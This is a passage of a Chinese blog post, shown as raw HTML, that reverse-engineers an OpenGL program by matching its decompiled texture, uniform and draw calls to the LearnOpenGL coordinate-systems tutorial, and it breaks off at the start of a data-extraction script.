href="https://learnopengl.com/code_viewer_gh.php?code=src/1.getting_started/6.3.coordinate_systems_multiple/coordinate_systems_multiple.cpp">https://learnopengl.com/code_viewer_gh.php?code=src/1.getting_started/6.3.coordinate_systems_multiple/coordinate_systems_multiple.cpp</a><br>简单对比了一下，发现大部分代码一致，模型数据也能对上。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">float</span> vertices[] = &#123;<br>    <span class="hljs-comment">//  坐标               纹理坐标</span><br>    <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">0.0f</span>,<br>     <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">0.0f</span>,<br>     <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">1.0f</span>,<br>     <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">1.0f</span>,<br>    <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">1.0f</span>,<br>    <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">0.0f</span>,<br><br>    <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">0.0f</span>,<br>     <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">0.0f</span>,<br>     <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">1.0f</span>,<br>     <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">1.0f</span>,<br>    <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">1.0f</span>,<br>    <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">0.0f</span>,<br><br>    <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">0.0f</span>,<br>    <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">1.0f</span>,<br>    <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">1.0f</span>,<br>    <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">1.0f</span>,<br>    <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">0.0f</span>,<br>    <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">0.0f</span>,<br><br>     <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">0.0f</span>,<br>     <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">1.0f</span>,<br>     <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">1.0f</span>,<br>     <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">1.0f</span>,<br>     <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">0.0f</span>,<br>     <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">0.0f</span>,<br><br>    <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">1.0f</span>,<br>     <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">1.0f</span>,<br>     <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">0.0f</span>,<br>     <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">0.0f</span>,<br>    <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">0.0f</span>,<br>    <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">1.0f</span>,<br><br>    <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">1.0f</span>,<br>     <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">1.0f</span>,<br>     <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">0.0f</span>,<br>     <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">1.0f</span>, <span class="hljs-number">0.0f</span>,<br>    <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">0.0f</span>,<br>    <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.5f</span>, <span class="hljs-number">-0.5f</span>,  <span class="hljs-number">0.0f</span>, <span class="hljs-number">1.0f</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="5-纹理贴图"><a href="#5-纹理贴图" class="headerlink" title="5. 纹理贴图"></a>5. 纹理贴图</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp">glGenTextures(<span class="hljs-number">1</span>, &amp;v58);<br>glBindTexture(<span class="hljs-number">0xDE1</span>, v58);                    <span class="hljs-comment">// GL_TEXTURE_2D</span><br>glTexParameteri(<span class="hljs-number">0xDE1</span>, <span class="hljs-number">0x2802</span>, <span class="hljs-number">0x2901</span>);       <span class="hljs-comment">// GL_TEXTURE_WRAP_S   GL_REPEAT</span><br>glTexParameteri(<span class="hljs-number">0xDE1</span>, <span class="hljs-number">0x2803</span>, <span class="hljs-number">0x2901</span>);       <span class="hljs-comment">// GL_TEXTURE_WRAP_T</span><br>glTexParameteri(<span class="hljs-number">0xDE1</span>, <span class="hljs-number">0x2801</span>, <span class="hljs-number">0x2601</span>);       <span class="hljs-comment">// GL_TEXTURE_MIN_FILTER GL_LINEAR</span><br>glTexParameteri(<span class="hljs-number">0xDE1</span>, <span class="hljs-number">0x2800</span>, <span class="hljs-number">0x2601</span>);       <span class="hljs-comment">// GL_TEXTURE_MAG_FILTER</span><br>.......<br>  glTexImage2D(<span class="hljs-number">0xDE1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x1907</span>, LODWORD(width), height, <span class="hljs-number">0</span>, <span class="hljs-number">0x1907</span>, <span class="hljs-number">0x1401</span>, data);<br>  glGenerateMipmap(<span class="hljs-number">0xDE1</span>);<br>.......<br></code></pre></td></tr></table></figure><h2 id="6-主循环用模型绘图"><a href="#6-主循环用模型绘图" class="headerlink" title="6. 主循环用模型绘图"></a>6. 主循环用模型绘图</h2><p>配置 view 、 model 、 projection 数据<br>view 矩阵源于鼠标坐标的一些变换</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 固定</span><br>loc_projection = glGetUniformLocation(v7, v13);<br>glUniformMatrix4fv(loc_projection, <span class="hljs-number">0</span>, mat_projection, v37);<br><br><span class="hljs-comment">// 鼠标数据计算而来</span><br>loc_view = glGetUniformLocation(v7, v17);<br>glUniformMatrix4fv(loc_view, <span class="hljs-number">0</span>, mat_view, v38);<br><br><span class="hljs-comment">// 坐标数组数据 3 * 1019 * sizeof(float)，内嵌循环处理</span><br>loc_model = glGetUniformLocation(v7, v29);<br>glUniformMatrix4fv(loc_model, <span class="hljs-number">0</span>, mat_model, v39);<br><br>....<br><br><span class="hljs-comment">// 画图</span><br>glDrawArrays(<span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">36</span>);               <span class="hljs-comment">// GL_TRIANGLES</span><br></code></pre></td></tr></table></figure><p>坐标数据<br>start:0xF0EF20<br>end: 0xF11EE4<br>size: 1019</p><p>数据提取如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span 